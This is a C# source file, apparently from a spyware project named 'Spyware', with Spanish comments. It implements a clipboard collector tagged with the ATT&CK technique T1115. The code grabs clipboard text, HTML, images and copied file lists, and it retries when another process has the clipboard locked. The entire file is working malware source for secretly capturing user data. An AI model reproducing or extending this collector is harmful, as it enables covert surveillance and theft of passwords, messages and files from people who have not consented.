using System.Collections.Specialized;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Spyware.Core.Configuration;
using Spyware.Core.Imaging;
using Spyware.Core.Logging;
// Alias necesario: dentro del espacio de nombres Spyware.Collectors.Clipboard el
// nombre simple "Clipboard" enlaza con el propio espacio de nombres y tapa la
// clase System.Windows.Forms.Clipboard.
using WinFormsClipboard = System.Windows.Forms.Clipboard;

namespace Spyware.Collectors.Clipboard;

public sealed record ClipboardSnapshot(
    string? Text, string? Html, byte[]? ImagePng, IReadOnlyList<string>? Files)
{
    public bool HasContent =>
        !string.IsNullOrEmpty(Text) || !string.IsNullOrEmpty(Html) ||
        ImagePng is { Length: > 0 } || Files is { Count: > 0 };
}

/// <summary>T1115 — Clipboard Data. Debe invocarse en un hilo STA.</summary>
public static class ClipboardReader
{
    public static ClipboardSnapshot Read(ClipboardSection config, ILog log)
    {
        string? text = null;
        string? html = null;
        byte[]? png = null;
        IReadOnlyList<string>? files = null;

        try
        {
            if (config.CaptureFiles && WinFormsClipboard.ContainsFileDropList())
            {
                StringCollection collection = WinFormsClipboard.GetFileDropList();
                List<string> entries = new(collection.Count);
                foreach (string entry in collection) entries.Add(entry);
                files = entries;
            }

            if (WinFormsClipboard.ContainsText(TextDataFormat.UnicodeText))
                text = WithRetry(() => WinFormsClipboard.GetText(TextDataFormat.UnicodeText));

            if (string.IsNullOrEmpty(text) && WinFormsClipboard.ContainsText(TextDataFormat.Text))
                text = WithRetry(() => WinFormsClipboard.GetText(TextDataFormat.Text));

            if (config.CaptureHtml && WinFormsClipboard.ContainsData(DataFormats.Html))
                html = WinFormsClipboard.GetDataObject()?.GetData(DataFormats.Html) as string;

            if (config.CaptureImages && WinFormsClipboard.ContainsImage())
            {
                using System.Drawing.Image? image = WinFormsClipboard.GetImage();
                if (image is not null) png = ImageCompressor.ToPng(image);
            }
        }
        catch (ExternalException ex)
        {
            log.Warn("Portapapeles bloqueado por otra aplicación: " + ex.Message);
        }
        catch (Exception ex)
        {
            log.Warn("Lectura de portapapeles incompleta: " + ex.Message);
        }

        return new ClipboardSnapshot(text, html, png, files);
    }

    /// <summary>El portapapeles puede estar abierto por otro proceso: pequeños reintentos.</summary>
    private static T WithRetry<T>(Func<T> read, int attempts = 3)
    {
        for (int attempt = 1; attempt <= attempts; attempt++)
        {
            try { return read(); }
            catch (ExternalException) when (attempt < attempts) { Thread.Sleep(60 * attempt); }
        }

        return read();
    }
}
